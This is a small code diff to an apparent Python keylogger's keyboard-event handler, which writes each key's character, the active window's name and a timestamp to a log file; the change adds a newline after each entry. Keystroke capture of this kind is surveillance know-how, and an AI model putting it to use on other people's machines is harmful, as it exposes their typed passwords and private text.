@@ -50,6 +50,7 @@ def OnKeyboardEvent(event, file_path, dir_path):
         txt = ",".join(["Key", str(event.Ascii), str(chr(event.Ascii)), "Window",
                           str(event.Window), event.WindowName, str(time.time())])
         f.write(txt)
+        f.write('\n')
 
         print(txt)
 
